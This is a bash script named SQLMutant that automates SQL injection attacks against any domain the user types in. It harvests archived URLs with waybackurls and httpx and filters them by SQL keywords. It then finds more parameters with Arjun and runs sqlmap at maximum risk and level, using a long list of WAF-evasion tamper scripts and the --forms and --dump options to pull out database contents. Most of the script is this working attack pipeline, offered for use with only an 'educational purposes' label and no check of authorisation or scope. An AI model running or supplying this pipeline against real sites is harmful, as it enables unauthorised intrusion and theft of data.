#!/bin/bash
curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
echo ""
# Generate a random Sun Tzu quote for offensive security
# Array of Sun Tzu quotes
quotes=("The supreme art of war is to subdue the enemy without fighting." "All warfare is based on deception." "He who knows when he can fight and when he cannot, will be victorious." "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")
# Get a random quote from the array
random_quote=${quotes[$RANDOM % ${#quotes[@]}]}
# Print the quote
echo "Offensive Security Tip: $random_quote - Sun Tzu" | lolcat
sleep 1
echo "MEANS, IT'S ☕ 1337 ⚡ TIME, 369 ☯ " | lolcat
sleep 1
figlet -w 80 -f small SQLMutant | lolcat
echo ""
echo "[YOUR ARE USING SQLMutant.sh] - (v1.0) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
sleep 1
#check if the user is connected to the internet
tput bold;echo "CHECKING IF YOU ARE CONNECTED TO THE INTERNET!" | lolcat
# Check connection
wget -q --spider https://google.com
if [ $? -ne 0 ];then
    echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING SQLMutant.sh!" | lolcat
    exit 1
fi
tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat

# Get domain from user input
echo "Please enter the domain to scan (e.g. example.com):" | lolcat
read domain

# Create a directory for the output files
echo "Creating directory for output files..." | lolcat
mkdir "$domain"
sleep 1
# Get URLs from Wayback Machine and filter them using HTTPX
echo -e "Fetching URLs from Wayback Machine and \e[91madvanced\e[0m Regex Filtering using HTTPX..." | lolcat
waybackurls "$domain" | httpx -verbose | tee "$domain/all_urls.txt" | grep -iE '(\?|\=|\&)(id|select|update|union|from|where|insert|delete|into|load_file|outfile|concat|concat_ws|group_concat|information_schema)' | sort -u > "$domain/sql_ready_urls.txt"

# Inform user about the number of URLs found
num_urls=$(wc -l "$domain/all_urls.txt" | cut -d ' ' -f 1)
echo -e "Found $num_urls URLs for $domain \e[91mbefore\e[0m applying the \e[92mMagic Regex Patterns\e[0m" | lolcat
sleep 5  # Pause for 5 seconds

# Inform user about the number of URLs ready for SQL injection testing
num_sql_urls=$(wc -l "$domain/sql_ready_urls.txt" | cut -d ' ' -f 1)
echo -e "Found $num_sql_urls URLs ready for SQL injection \e[91mafter\e[0m applying the \e[92mMagic Regex Patterns\e[0m $domain." | lolcat
sleep 5  # Pause for 5 seconds
# Run Arjun with 20 threads to find more parameters
echo -e "Finding \e[91mmore\e[0m parameters using Arjun with 20 threads..." | lolcat
arjun -i "$domain/sql_ready_urls.txt" -t 20 --disable-redirects -oJ "$domain/arjun_output.json" 

# Extract URLs with parameters from Arjun's output
if [ -f "$domain/arjun_output.json" ]; then
  cat "$domain/arjun_output.json" | jq -r '.[] | select(.params != null) | .url' > "$domain/arjun_urls.txt"
else
  touch "$domain/arjun_urls.txt"
fi

# Merge the URLs found by Arjun with the ones ready for SQL injection
echo "Merging Arjun and Wayback URLs with Magic..." | lolcat
if test -f "$domain/arjun_urls.txt"; then cat "$domain/sql_ready_urls.txt" "$domain/arjun_urls.txt" | sort -u > "$domain/sql_ready_urls2.txt"; else cat "$domain/sql_ready_urls.txt" > "$domain/sql_ready_urls2.txt"; fi

# Inform user about the new number of URLs ready for SQL injection testing
num_sql_urls2=$(wc -l "$domain/sql_ready_urls2.txt" | cut -d ' ' -f 1)
echo -e "Found $num_sql_urls2 URLs \e[91mready\e[0m for SQL injection testing for $domain after using Arjun and Mixing all results..."
sleep 5  # Pause for 5 seconds
# Test SQL injection on the new list of URLs using SQLMAP
echo -e "Testing SQL injection on the new list of URLs using SQLMAP with a Tweaked \e[91mAgressive\e[0m Approach..." | lolcat
sqlmap -m "$domain/sql_ready_urls2.txt" --risk=3 --smart --hpp --level=5 --random-agent --threads=10 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --skip-urlencode --string "saintdrugis1337" --forms --dump --dbms=mysql --batch
echo "Make sure to examine the results manually in the location where it saves all the results: /root/.local/share/sqlmap/output/" | lolcat
sleep 3
echo -e "\n\033[1;32mThis tool comes with amazing AI-created photos that were done during coding this. \033[0m"
echo -e "\033[1;32mA lot of hours were spent on optimizing this massive SQL command and the flow. \033[0m"
echo -e "\033[1;32mFeel free to check it out on our GitHub repo! \033[0m"

echo -e "\n\033[1;34m--------------------------------------------\033[0m"

echo -e "\033[1;36mYou can view the wallpapers that inspired us during the creation of this tool on our GitHub repo: \033[0m"
echo -e "\033[1;33mIn Your Directory: SQLMutant/WallPapers Imag1nations creating this tool \033[0m"

echo -e "\033[1;34m--------------------------------------------\033[0m\n"

echo -e "\033[1;32mThank you for using SQLMutant by SaintDruG! \033[0m"
# Matrix effect
echo "Exiting the Matrix for 5 seconds in:" | toilet --metal -f term -F border
sleep 1
echo "3" | toilet --gay -f term -F border
sleep 1
echo "2" | toilet --metal -f term -F border
sleep 1
echo "1" | toilet --gay -f term -F border
sleep 1

R='\033[0;31m'
G='\033[0;32m'
Y='\033[1;33m'
B='\033[0;34m'
P='\033[0;35m'
C='\033[0;36m'
W='\033[1;37m'

for ((i=0; i<5; i++)); do
    echo -ne "${R}10 ${G}01 ${Y}11 ${B}00 ${P}01 ${C}10 ${W}00 ${G}11 ${P}01 ${B}10 ${Y}11 ${C}00\r"
    sleep 0.2
    echo -ne "${R}01 ${G}10 ${Y}00 ${B}11 ${P}10 ${C}01 ${W}11 ${G}00 ${P}10 ${B}01 ${Y}00 ${C}11\r"
    sleep 0.2
    echo -ne "${R}11 ${G}00 ${Y}10 ${B}01 ${P}00 ${C}11 ${W}01 ${G}10 ${P}00 ${B}11 ${Y}10 ${C}01\r"
    sleep 0.2
    echo -ne "${R}00 ${G}11 ${Y}01 ${B}10 ${P}11 ${C}00 ${W}10 ${G}01 ${P}11 ${B}00 ${Y}01 ${C}10\r"
    sleep 0.2
done
